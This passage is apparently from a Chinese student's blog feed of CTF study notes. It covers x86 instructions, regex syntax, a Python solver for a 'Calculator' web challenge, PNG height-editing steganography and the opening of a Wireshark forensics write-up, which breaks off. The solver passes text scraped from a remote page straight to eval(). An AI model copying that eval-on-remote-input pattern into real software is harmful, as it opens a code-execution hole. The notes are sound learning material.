二、整数和逻辑运算指令 加法指令：ADD/ADC 减法指令：SUB/SBB 加一指令：INC 减一指令：DEC 比较操作指令：CMP 乘法指令：MUL/IMUL 除法指令：DIV/IDIV 符号扩展指令：CBW/CWDE/CDQE 十进制调整指令：DAA/DAS/AAA/AAS 逻辑运算指令：NOT/AND/OR/XOR/TEST 三、移位指令 逻辑左移指令：SHL 逻辑右移指令：SHR 算术左移指令：SAL 算术右移指令：SAR 循环左移指令：ROL 循环右移指令：ROR 四、位操作指令 测试指令：BT 位测试并置位指令：BTS 位测试并复位指令：BTR 位测试并取反指令：BTC 位向前扫描指令：BSF 位向后扫描指令：BSR 五、控制转移指令 无条件转移指令：JMP 条件转移指令：Jcc/JCXZ 循环指令：LOOP/LOOPE/LOOPNE 过程调用指令：CALL 子过程返回指令：RET 中断指令：INTn、INT3、INTO、IRET 六、输入输出指令 端口输入指令：IN/INS 端口输出指令：OUT/OUTS3. 待解决的问题 对寄存器和内存器的理解； 看懂汇编语言指令； gdb指令的使用4. 学习感悟&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天了解了计算机系统底层的一些东西，虽然我没有太过于了解，但是我隐约的有一种感觉：如果要了解了这些细节的实现，在后面的学习中一定会学的更加透彻。但是今天接触到这些知识点，实着感觉到了难度和压力！这也是我以后要学好这门课的巨大动力！加油吧！明天继续学习。5.每日一句把每件小事都做好，那么离成功就不远了。]]></content>
      <tags>
        <tag>解题总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式总结（1）]]></title>
    <url>%2F2019%2F03%2F09%2F2019.03.09%EF%BC%8815%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;昨天对Web：Calculator题目做了详细的分析，但是有一个知识点（正则表达式）总结的不是很详细。当时做题的时候也正是正则表达式阻碍了很长时间，今天就详细的总结一下正则表达式的内容。 1.什么是正则表达式？ 正则表达式，又称规则表达式（英语：Regular Expression，在代码中常简写为regex、regexp或RE），是一种文本模式，描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。 2.正则表达式的功能？（1）验证字符串是否符合指定特征，比如验证是否是合法的邮件地址；（2）用来查找字符串，从一个长的文本中查找符合指定特征的字符串，比查找固定字符串更加灵活方便；（3）用来替换，比普通的替换更强大； 3.正则表达式的语法？（1）普通字符普通字符包括没有显式指定为元字符的所有可打印和不可打印字符。 可打印字符：是在包括所有大写和小写字母、所有数字、所有标点符号和一些其他符号。 不可打印字符：“\”为转义字符，在指定字母前面加上“\”，则表达的含义就不同了。但是还有其他一些有特殊用处的标点符号，在前面加 “\” 后，就代表该符号本身。比如：\^, $ 都有特殊意义，如果要想匹配字符串中 “^” 和 “$” 字符，则表达式就需要写成 “\\^” 和 “\$“ （2）元字符 所谓元字符就是指那些在正则表达式中具有特殊意义的专用字符，可以用来规定其前导字符（即位于元字符前面的字符）在目标对象中的出现模式。它是一个或一组代替一个或多个字符的字符。下图为元字符的总结，其中红色区域的为经常使用的。注：昨天在calculator题目里面，我当时用写的正则表达式为r’&lt; form action=”” method=”GET”&gt;&lt; span id=”exp”&gt;(.*?)\s+=\s+&lt; /span&gt;’，因为我想获取的内容是那个算术公式，所以我要返回给compile的为&lt; form&gt;标签中&lt; span&gt;标签的内容。因为&lt; form action=”” method=”GET”&gt;&lt; span id=”exp”&gt; &lt; /span&gt;是可打印的字符，直接写就可以。而(.*?)表示的意思是：“ . ”是匹配除换行符（\n、\r）之外的任何单个字符。“ * ”是匹配前面的子表达式零次或多次。” .* “表示单个字符匹配任意次。“ ? ”表示匹配模式是非贪婪的，即满足条件的情况只匹配一次。“ ( ) ”在python中表示匹配括号内的表达式，也表示一个组。 4.运算符的优先级？ \ ——&gt; 转义符 (), (?:), (?=), [] ——&gt; 圆括号和方括号 *, +, ?, {n}, {n,}, {n,m} ——&gt; 限定符 ^, $, \任何元字符、任何字符 ——&gt; 定位点和序列（即：位置和顺序） | ——&gt; 替换，”或”操作字符具有高于替换运算符的优先级，使得”m|food”匹配”m”或”food”。若要匹配”mood”或”food”，请使用括号创建子表达式，从而产生”(m|f)ood”。5. 学习感悟今天总结的内容，其实是我这几天学习正则表达式的一个总结，因为我还没有彻底学完学懂正则表达式的具体使用和使用规则，所以今天的知识点不全，等以后学懂正则表达式以后，再回来更博吧！（ps：个人在学习正则表达式的过程，有点感觉吃力，感觉知识点有点难）]]></content>
      <tags>
        <tag>解题总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web：Calculator解题总结]]></title>
    <url>%2F2019%2F03%2F08%2F2019.03.08%EF%BC%8814%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这几天做出来的题目，难度最大且花费时间最长的莫不过Web：Calculator和Web：RapidTyping，今天又对Web：Calculator这道题目的脚本做了一下改善，并分析了一下GET和POST的区别。 1. 前期准备 工具：谷歌浏览器 知识：python Requests模块（POST | GET | Session()）、Re模块（findall() | compile()）、正则表达式、eval()2. 思考过程1.如何计算网页上的算数公式，并提交成功，服务器响应请求呢？这是在做这道题首先要弄明白的问题，只有将整个流程搞懂、弄清，才能分布的去解题：&nbsp;&nbsp;&nbsp;&nbsp;①首先要获取网页地址，得到网页上的文本；&nbsp;&nbsp;&nbsp;&nbsp;②把相应的算术公式“拿出来”单独计算，得到结果（answer）；&nbsp;&nbsp;&nbsp;&nbsp;③把所得结果如何提交给请求服务器，返回相应的内容；&nbsp;&nbsp;&nbsp;&nbsp;④如何让服务器知道获得算式的和提交答案的是一个人；在正式做题前，我将这个问题拆分为这四步，但是每一步是如何实现的呢？这就有了以下的分析。 2.如何请求获取网页上的内容？ 对于获取网页所用的协议为HTTP的原理，其实这个知识点在前面的流量分析中有所提及（GET和POST的区别），今天就不过多的谈及，那么今天主要讲一下python Requests库中关于两者使用的语法：&nbsp;&nbsp;&nbsp;&nbsp;①首先要导入requests模块（它是一个python HTTP库），因为post和get请求都被包含在这个模块中；&nbsp;&nbsp;&nbsp;&nbsp;②GET：如果是手工构建 URL，那么数据会以键/值对的形式置于 URL 中，跟在一个?的后面。例如，httpbin.org/get?key=val。 Requests 允许你使用 params 关键字参数，以一个字符串字典来提供这些参数。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = requests.get(“url”, params={‘key’:value})&nbsp;&nbsp;&nbsp;&nbsp;②POST：通常，想要发送一些编码为表单形式的数据——非常像一个 HTML 表单。要实现这个，只需简单地传递一个字典给 data 参数。数据字典在发出请求时会自动编码为表单形式：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload = {‘key1’: ‘value1’, ‘key2’: ‘value2’}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = requests.post(“url”, data=payload)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(r.text)那么对于第①个问题就有了相应的解决办法，那么怎么解决获取算术公式，并加以计算这个问题呢？ 3.如何得到要求计算式子的结果呢？ 这里也应该相应的进行拆分分析： 1. 我如何才能获取那些数字和计算符号呢？通过查阅有关资料，得到了re模块的两个函数“re.findall()”和“re.compile()”以及有关正则表达式的应用:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ re.findall()：Return all non-overlapping matches of pattern in string, as a list of strings. The string is scanned left-to-right, and matches are returned in the order found. If one or more groups are present in the pattern, return a list of groups; this will be a list of tuples if the pattern has more than one group. Empty matches are included in the result unless they touch the beginning of another match.（返回字符串中pattern的所有非重叠匹配，作为字符串列表。从左到右扫描字符串，并按找到的顺序返回匹配项。 如果模式中存在一个或多个组，则返回组列表; 如果模式有多个组，这将是一个元组列表。结果中包含空匹配，除非它们触及另一个匹配的开头）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以上是官方对re.findall()定义 findall(patern, string, flags=0)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern: 正则中的模式字符串。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;string: 要被查找替换的原始字符串。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flags: 标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ re.compile()：Compile a regular expression pattern, returning a pattern object.（编译正则表达式模式，返回模式对象）这是官方对compile()的定义，可以看出返回的是一个匹配对象，它单独使用就没有任何意义，需要和findall(), search(), match(）搭配使用。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在了解了上面两个重要函数的功能后，就对要获取方法有了目标：①先通过re.compile()将正则表达式的字符串形式编译为Pattern实例，②然后通过re.findall() 从左到右扫描字符串，并按找到的顺序返回匹配项。 如果模式中存在一个或多个组，则返回组列表; 如果模式有多个组，这将是一个元组列表。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ 正则表达式：如何使用正则表达式呢？这里就不过多叙述，在下面的解题的时候有所涉及。2. 如何将提取的算术公式进行运算呢？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面我们通过re.compile()he re.findall()函数，得到了网页上的算数公示（一个字符串），那么如何将这个字符串进行运算呢？下面再引进一个函数：**eval(expression, globals=None, locals=None)**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;官方文档中的解释是，eval()可以将字符串str当成有效的表达式来求值并返回计算结果。globals和locals参数是可选的，如果提供了globals参数，那么它必须是dictionary类型；如果提供了locals参数，那么它可以是任意的map对象。 4.在向服务器提交结果时，如何让服务器知道获得算式的和提交答案的是一个人？ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一开始向服务器发送了请求，并获得了结果，但是在提交答案的时候，服务器怎么知道你是谁？通过查阅资料，引入了Requests库的Session对象：session对象能够帮我们跨请求保持某些参数，也会在同一个session实例发出的所有请求之间保持同一个cookies，那么就可以通过相同的cookies让服务器知道获得算式的和提交答案的是一个人。 3. 解题过程有了上述的分析和知识后，现在可以进行编写python脚本解题了。下面直接给出代码： 1 import re 2 import requests 3 t = requests.Session() 4 url = &#39;http://web1.blue-whale.me:23331/calculator/&#39; 5 r = t.get(url) 6 r.encoding = &#39;utf-8&#39; 7 print(r.text) 8 num = re.findall(re.compile(r&#39;&lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;&lt;span id=&quot;exp&quot;&gt;(.*?)\s+=\s+&lt;/span&gt;&#39;), r.text)[0] 9 print (&#39;result:\n\n%s=%d\n&#39; % (num, eval(num))) 10 ans=eval(num) 11 flag = t.get(url, params={&#39;answer&#39;:ans}) 12 print(flag.text) 1.import re ##这里是导入python的re模块，因为后面用到了re模块的findall()和compile()； 2.import requests ##这里是导入python的requests模块，因为后面用到了requests模块的session()、get()和post()； 3.t = requests.Session() ##生成cookies，为了让服务器知道获得算式的和提交答案的是一个人； 4.url = ‘http://web1.blue-whale.me:23331/calculator/‘ ##实验网址，为了以后输入简便直接复制给url对象； 5.r = t.get(url) ##通过get获取目的网址，生成一个名为 r 的 Response 对象，我们就可以在这个对象中获取我们想要的信息； 6.r.encoding = ‘utf-8’ ##修改编码 ，因为后期要读取 r 响应对象的信息，而我们在目标地址中看到的ContentType：text/html charset=‘UTF-8’，所以编码为“utf-8” 7.print(r.text) ##打印 r 响应对象的文本内容，如下图； 8.num = re.findall(re.compile(r’&lt; form action=”” method=”GET”&gt;&lt; span id=”exp”&gt;(.*?)\s+=\s+&lt; /span&gt;’), r.text)[0] &nbsp;&nbsp;&nbsp;&nbsp;▶ compile括号中的内容：r为转义字符；&nbsp;&nbsp;&nbsp;&nbsp;▶ ‘ ’中的是提取算术表达式的正则表达式；&nbsp;&nbsp;&nbsp;&nbsp;▶ (.*?)表示要返回的列表；&nbsp;&nbsp;&nbsp;&nbsp;▶ \s+表示一个空格； 9. print (‘result:\n\n%s=%d\n’ % (num, eval(num))) ##打印结果 10.ans=eval(num) ##将提取的算术公式进行计算的结果赋值给ans变量； 11. flag = t.get(url, params={‘answer’:ans}) ##因为method被设置为get，所以在这里只能用get的方法进行提交；因为我尝试提交了一下，返回的网页后面的params为answer，所以这里的key值为answer，就被自动被设置为?anwers=ans； 12. print(flag.text) ## 打印返回的网页； 4.学习感悟&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天的总结，我感觉比我当时做题还难，这也许就是落实的难度大的原因吧！今天又写总结的地方，我感觉缺漏和不足还有很多，以后学习的过程中还得回来不断的更新，慢慢的积累吧！ 5.每日一句&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;只要下定决心，过去的失败，正好是未来行动的借鉴；只要不屈不挠，一时的障碍，正好是推动成功的力量。]]></content>
      <tags>
        <tag>解题总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Misc：Invisible flag解题总结]]></title>
    <url>%2F2019%2F03%2F07%2F2019.03.07%EF%BC%8813%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;昨天对隐写题做了个大概的总结，发现关于图片的信息隐写的总结还不完整，对于png格式的图像只是说了LSB方法，今天看到Misc：Invisible flag题目，再来说一个关于png隐写的类型：实质还是通过png格式的结构来隐写的。 1.前期准备 工具：010editor 知识：png格式的文件结构2.思考过程1.png图片文档结构是什么？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其实这个问题在昨天的总结里面已经有过介绍，但是有关png图片文件的结构对今天的解题至关重要，那么在详细地讲述一下。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;png除了开始的文件标识头，PNG还定义了两种数据块：关键数据块和辅助数据块。关键数据块定义了4个标准的数据块（文件头数据块-IHDR、调色板数据块（PLTE）、图像数据块-IDAT、图像结束数据块-IEND），除了调色板数据块（PLTE）可选，其他三个是png数据块中必须包含的3个数据块，其他辅助数据块也可以选择性的添加。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;png数据流中每个数据块都是有4个部分构成：数据块长度（4byte）、数据块标识（4字节）、数据内容（长度可变）和CRC校验码（4byte）。下面我就说一下这文件标识和4个标准数据块：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;①文件标识头：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;开始的四个字节固定为89 50 4E 47 0D 0A 1A 0A (第一个字节为89，超出了ascii表的范围，目的是为了避免将png图像当做文本文件处理)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;②文件头数据块（IHDR）：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最重要的为文件头数据块，每个png的数据流中只包含一个IHDR，并作为第一个数据块出现在PNG数据流中，包含了png文件中（数据内容）存储了图像的基本信息：图像宽度（4byte）、图像高度（4位）、颜色深度（1byte）、颜色类型（1byte）、压缩方法（使用LZ77派生压缩 | 1byte | 规定此字节为0）、滤波器方法（通常此字节为0 | 1byte）、隔行扫描方法（非隔行扫描：0 ，7遍隔行扫描方法：1 | 1byte ）和CRC校验（4byte）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③调色板数据块（PLTE）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;含有与索引彩色图像相关的彩色变换数据，它仅与索引彩色图像有关，位置要放在图像数据块之前。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④图像数据块（IDAT）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IDAT是一个多数据块，因为PNG的图像数据块（IDAT）存储图像的实际数据，相当于BMP图像的图像数据，由于PNG可包含多幅图像，所以PNG的图像数据块可能是由一幅图像的数据组成，也可能是由多幅图像的数据组成。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于图像数据块是压缩数据，如果能够掌握压缩和解压缩的方法，那么就能轻易而举地将其它类型的图片与PNG图片进行转换。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑤图像结束数据块（IEND） &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。一共有12个字节，如果没有人为进行修改，那么这12个字节通常为：00 00 00 00 49 45 4E 44 AE 42 60 82 2.010editor软件的功能是什么？ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;010编辑是一款非常强大的文本/十六进制编辑器，除了文本/十六进制编辑外，还包括文件解析，计算器，文件比较等功能，但它真正的强大之处还在于文件的解析功能。我们可以使用010Editor官方网站提供的解析脚本（二进制模板）对AVI，BMP，PNG，EXE等简单格式的文件进行解析。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个题目中，可以用010editor打开，然后观察和修改文件的参数。 3. 解题过程 下载图片并认真审题，可以从图片（图①）和题目提示：图片长度，可以发现图片的下方可能有信息被隐藏起来了，可以通过010editor修改图片长度（也就是高度）； 用010editor打开图像，根据前期做的功课，认真分析该png图片的结构：①红色区域是png文件的标识符，共有8个字节：89 50 4E 47 0D 0A 1A 0A②红色区域是PNG文件的文件头数据块（IHDR）&nbsp;▶ 00 00 00 0D：数据块长度是13B；&nbsp;▶ 49 48 44 52：数据标识IHDR；&nbsp;▶ 00 00 02 34：图像宽度为564px；&nbsp;▶ 00 00 01 90：图像高度为400px；（可以看到图片高度像素小，可能信息被隐藏）&nbsp;▶ 08：24位颜色深度&nbsp;▶ 02：颜色类型为真彩&nbsp;▶ 00：使用了压缩&nbsp;▶ 00：滤波器方法，通常为0&nbsp;▶ 00：非隔行扫描&nbsp;▶ 36 8C 6D 31：CRC校验码 （循环冗余检测中的值是对第２部分数据块符号和第３部分数据域进行计算得到的）③红色区域为PNG文件的图像数据块（IDAT）&nbsp;▶ 00 00 FF FF：数据块长度，该png的数据块长度是65535B；（其长度不超过231-1个字节）&nbsp;▶ 49 44 41 54 ：数据标识IDAT；&nbsp;▶ 下面的数据内容、CRC就不介绍了④红色区域的为PNG文件的图像结束数据块（IEND）&nbsp;▶ 00 00 00 00：数据块长度为0；&nbsp;▶ 49 45 4E 44：数据标识IEND&nbsp;▶ AE 42 60 82：CRC码（因为数据内容为0，所以直接是CRC码）&nbsp;▶ 由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82。 在对该PNG图片结构进行了分析以后，那么修改一下IHDR中的图片高度为：00 00 02 34（564px）与宽度一样，就得到下面的图片 疑问：修改了高度以后，数据流中有哪些数据发生了变化？4. 学习感悟&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前几天在解这道题的时候，也查了很多资料，也觉得自己的理解更深了，可是今天的回顾和总结，又让我对这个知识点更加理解了。学习是个过程，所以以后不能总要想着“我今天就要把Python学完”，这是不可能的，必须要经过一个循环渐进的过程，只有不断的去思考去总结，才能真正的把学习学到手！5. 每日一句&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一个人最大的挑战，是如何去克服自己的缺点。]]></content>
      <tags>
        <tag>解题总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习总结（1）：隐写术]]></title>
    <url>%2F2019%2F03%2F06%2F2019.03.06%EF%BC%8812%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;已经做了13道题目，虽然每次做完题后都会记录一下学习的过程，总结一下相关知识点，但是这几天感觉心里有这些知识，但是没有形成一个体系，也许下次再做的时候可能就不会了，那么这几天主要是对前面几天所学知识进行一下总结，让自己明白每个只是背后的学科是什么样的。 1. 知识目录 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(1)隐写问题：图片隐写（LSB、EXIF和图片格式）和文档隐写（docx）；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(2)流量分析问题：HTTP流量分析、TCP分析、其他流量分析；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(3)密码破解问题：明文破解、暴力破解；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(4)python：python使用、第三方库的使用； 2. 知识详解——(1)隐写问题&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(1)什么是隐写？为什么要隐写？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;隐写，顾名思义就是把信息隐藏起来，利用“正常”数据载体，在用户不知名的情况下在信道中进行传递。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;之所以信息隐写就是为了想达到隐写者的目的，能够更好地实现恶意攻击、秘密传输等功能，因为信息隐藏的载体是多种多样的，主要有图片、视频、文档、硬盘等等，所以信息更不容易被识别。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(2)信息隐写有哪些分类呢？ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;①语言隐写术[1]：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ 基于语法的语言隐写术：利用自然语言的语法结构来嵌入隐秘信息。这类语言隐写术的载密文本是隐写算法在隐秘信息的控制下产生的，因而也可以称作基于文本生成的语言隐写术；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ 基于语义的语言隐写术：是通过同义替换来隐写隐秘信息的，它把隐秘信息嵌入载体文本中的同时，尽可能地维持其语义不变。这类方法根据替换成份可分为基于同义词或者同义短语替换的隐写术、基于等价规则替换的隐写术、基于同义句子替换的隐写术和基于翻译的隐写术等。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;②技术隐写术&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ 系统结构层次：纯隐写术、密钥隐写术和公钥隐写术；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ 空间结构层次：信道隐写术、时空域隐写术和变换域隐写术；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ 载体对象层次：文本隐写术、图像隐写术、音频隐写术和视频隐写术；注：今天主要是总结载体对象层次的隐写方式 3. 载体对象层次的隐写&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(1)文本隐写&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;①文本主要格式：pdf、doc、docx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;②文本隐写原理：从docx那道题可以看出，文本信息隐写主要是通过对文件结构的分析，将信息隐藏在文件结构中。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③各文本结构：（知识点太多，详情查看原文）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ PDF：https://lazymind.me/2017/10/pdf-structure/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ DOC：https://wenku.baidu.com/view/0ab99acaa1c7aa00b52acbc9.html&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ DOCX：本质是ZIP文件 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(2)图像隐写 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;①图片主要格式：PNG、JPG、GIF、BMP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;②图像隐写原理：最低相位lsb（无损压缩png或无压缩bmp）、基于DCT域相关性的非对称隐写[2]（jpg）、基于颜色-梯度共生矩阵的GIF图像的隐写[3]（GIF）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③各图片结构：（知识点太多，详情查看原文）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ PNG： https://blog.csdn.net/qq_21950929/article/details/79198814&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ JPG：https://blog.csdn.net/STN_LCD/article/details/78629029&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ GIF：https://blog.csdn.net/MoGuanXiao/article/details/52992009&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ BMP：https://www.cnblogs.com/wainiwann/p/7086844.html &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(3)音频隐写 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;①音频主要格式：mp3、wma、wav&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;②音频隐写方法：摩斯电码隐写、二进制隐写、音频转换隐写、MP3Stego隐写等。注：今天并没有深入接触音频这块的相关原理，所以内容不充分，后续我将继续更新。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(4)视频隐写[4] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;①视频主要格式：mp4、.rmvb、.avi、.flv&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;②视频隐写方法：压缩域视频隐写技术——&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ 基于运动向量的视频隐写：将视频压缩编码框架中运动估计模块生成的运动向量作为密息载体；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ 基于帧内预测模式的视频隐写：将压缩视频中帧内编码（帧内编码）单元采用的帧内预测模式作为密息载体；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ 基于帧间预测模式的视频隐写：将压缩视频中帧间编码（Inter-coded）单元采用的帧间预测模式作为密息载体；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ 基于变换系数的视频隐写：通过修改视频压缩编码框架中变换编码模块生成的变换系数（如DCT系数）以实施隐写，一般具有较大的嵌入容量；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ 基于量化参数的视频隐写：通过调制修改编码单元的量化参数以嵌入密息；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ 基于熵编码的视频隐写：将视频压缩编码框架中熵编码模块生成的码字作为密息载体；注：虽然上面的隐写方法并不是很懂，但是在这里总结是因为自己想在心里有个大体的轮廓，以后再在参考文献上研读； 4. 学习感悟&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在总结之前本来想在今天弄懂相关知识的，但是在阅读相关文献和博客的时候，发现越往下总结带出来的知识点越多、越南理解，真的没有想到隐写术背后，居然是这么庞大的一个知识体系，看来要想真正掌握隐写题，自己还得在以后的学习中慢慢积累和总结。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;就从今天这次的总结经验来看，所有知识点并没有自己想的那么简单，要想在网安领域有所成就，必须得好好努力啦！以后就脚踏实地的向前走吧，走的路上要注重积累。 5. 参考文献[1]陈志立. 语言隐写术的分析与设计研究[D].中国科学技术大学,2009.[2]毛炳华,王子驰,张新鹏.基于DCT域相关性的非对称JPEG隐写[J].计算机科学,2019,46(01):196-200.[3]巩锐. GIF图像隐写分析技术研究[D].西南交通大学,2013.[4]张弘,尤玮珂,赵险峰.视频隐写分析技术研究综述[J].信息安全学报,2018,3(06):13-27. 6. 每日一句驾驭命运的舵是奋斗。不抱有一丝幻想，不放弃一点机会，不停止一日努力。]]></content>
      <tags>
        <tag>解题总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Misc：Forensics2解题总结 + 学习总结]]></title>
    <url>%2F2019%2F03%2F05%2F2019.03.05%EF%BC%8811%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天又成功解出两道题，虽然很累，但是带来的收获确实很大，今天先总结一下关于Misc：Forensics2题目的知识吧。（PS：越往下做越感觉难度增加，我准备先继续做题了，这两天再好好的回顾和总结一下以前的知识点） 1. 前期准备 工具：wireshark 知识：ICMP、ARP、SSH、NFS、RPC有关知识2. 思考过程 上述协议的工作原理是什么？功能是什么？ ICMP：它位于ISO参考模型的网络层，是网络控制报文协议，当IP数据包传送过程中发生错误时（源点抑制、路由不可达、参数问题等），ICMP协议会将错误信息封包，然后返回给主机。它有两大类：查询报文和差错报文，而在这个数据包中的ICMP是查询报文的类型（PING）； ARP：简单介绍它的功能用来通过MAC查询IP地址； SSH：SSH协议（Secure Shell）是基于应用层的协议，他能在传输过程中为明文数据进行加密，安全性更高；它的工作过程大概为：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;①版本号协商阶段：SSH目前包括 SSHv1和SSHv2两个版本， 双方通过版本协商确定使用的版本；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;②密钥和算法协商阶段：SSH支持多种加密算法， 双方根据本端和对端支持的算法，协商出最终使用的算法；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③认证阶段：SSH客户端向服务器端发起认证请求， 服务器端对客户端进行认证；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④会话请求阶段：认证通过后，客户端向服务器端发送会话请求；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑤交互会话阶段 ：会话请求通过后，服务器端和客户端进行信息的交互 NFS：就是通过网络共享目录，让网络上的其他服务器能够挂载访问共享目录内的数据（一般共享视频，图片等静态数据）； RPC(Remote Procedure Call)：因为NFS本身是没有提供信息传输的协议和功能的，但NFS却能让我们通过网络来分享资料，这是因为NFS使用了一些其它的传输协议，而这些传输协议用到了RPC的功能。 两台主机间进行的是什么交互过程？打开wireshark，不难发现主要的交互过程是Client A（10.0.0.22）和Sever B（10.0.0.2）用SSHv2对TCP传输的数据进行加密，并传输的文件在服务端共享，在客户端挂载使用的一个大概过程； 所要找的file应该在哪被找到？可以看出file被加密传输，进行解密对我来说非常困难，那么流量中有NFS，文件是否被网络共享？那么应重点关注的对象是不是NFS？3. 解题过程 